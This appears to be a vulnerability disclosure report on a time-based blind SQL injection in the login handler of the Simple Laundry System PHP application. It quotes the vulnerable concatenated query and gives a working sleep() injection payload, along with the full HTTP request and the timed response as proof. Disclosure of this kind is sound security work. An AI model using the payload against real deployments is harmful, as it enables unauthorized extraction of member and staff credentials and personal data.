## SIMPLE_LAUNDRY_SYSTEM userchecklogin.php Time-Based Blind SQL Injection Vulnerability

### I. Vulnerability Impact

The `userId` parameter of the member login handler `userchecklogin.php` is concatenated into the authentication query without any escaping, so an attacker can inject SQL expressions into the `WHERE` clause. By placing a `sleep()` call inside the injected expression the attacker can delay the response at will and extract arbitrary data from the database character by character. The affected database holds the `member` and `staff` tables, which contain every account, MD5 password hash and personal detail of the laundry shop's members and employees.

### II. Source Code Analysis

The vulnerability resides in `userchecklogin.php`, lines 7-24:

```php
$l_user = trim($_POST['userId']);
$l_pass = md5(trim($_POST['password']));

if ($l_user != "" && $l_pass != "")
{
    ...
    $q="SELECT * FROM member WHERE memberUserId='".$l_user."'"."AND password='".$l_pass."'";

    require_once('connect.php');
    if ($res = $mysqli->query($q))
    {
        if (mysqli_num_rows($res) == 1)
        {
```

`$l_user` is taken straight from `$_POST['userId']` and only passed through `trim()`, which removes whitespace but does not escape any SQL metacharacter. It is then concatenated between two string literals of the query, `memberUserId='` and `'AND password='`, and the whole statement is executed with `$mysqli->query()`. No `mysqli_real_escape_string()`, no parameter binding and no type casting is applied, so a single quote in the parameter closes the `memberUserId` literal and the remainder is parsed as SQL.

The password is hashed with `md5()` before it is used, so the password field cannot carry the injection — `userId` is the only injectable parameter. Because the PHP template appends `'AND password='<md5>'` after the injected value, a working payload has to either re-balance the trailing quote or comment the rest of the statement out; if the injected text leaves the statement syntactically invalid, `$mysqli->query()` returns `false`, both `if` branches are skipped and the script returns an empty response with no error message, so the injection must be confirmed by response timing.

### III. Payload

The core injection payload is:

```
user2'and(select*from(select sleep(5))a)and'1'='1
```

The resulting SQL statement executed by the server becomes:

```sql
SELECT * FROM member WHERE memberUserId='user2'and(select*from(select sleep(5))a)and'1'='1'AND password='7e58d63b60197ceb55a1c487989a3720'
```

The leading `user2'` closes the `memberUserId` literal, `and(select*from(select sleep(5))a)` wraps `sleep()` in a derived table so that it can be used as a scalar expression and forces MySQL to wait five seconds, and the trailing `and'1'='1` re-balances the quote that the PHP template appends, leaving the original `AND password='...'` condition syntactically intact.

```
POST /userchecklogin.php HTTP/1.1
Host: bbn
Content-Length: 95
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36 Edg/156.0.0.0
Origin: http://bbn
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://bbn/usersignin.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=spacqjha3aq8tcnnpfgfdvce3t
Connection: keep-alive

userId=user2'and(select*from(select+sleep(5))a)and'1'='1&password=user2&userSignInSubmit=SignIn
```

The response is returned after 5.06 seconds instead of the 0.15 seconds a normal login attempt takes, while the body is still the ordinary "invalid credentials" page, which confirms that the injected `sleep()` was evaluated inside the `WHERE` clause and that the application logic itself was not broken:

```
HTTP/1.1 200 OK
Server: nginx/1.15.11
Date: Fri, 30 Oct 2026 08:49:04 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/7.3.4
Set-Cookie: PHPSESSID=68mtg03jqruilicnv0du8q33fp; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Refresh: 2; url=usermanagement.php

<h1 style="text-align: center; font-family: monospace;">INVALID USERNAME OR PASSWORD!!<h1>
```

### IV. Source Download

https://code-projects.org/simple-laundry-system-in-php-with-source-code/



![image-20261030165102862](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20261030165102862.png)
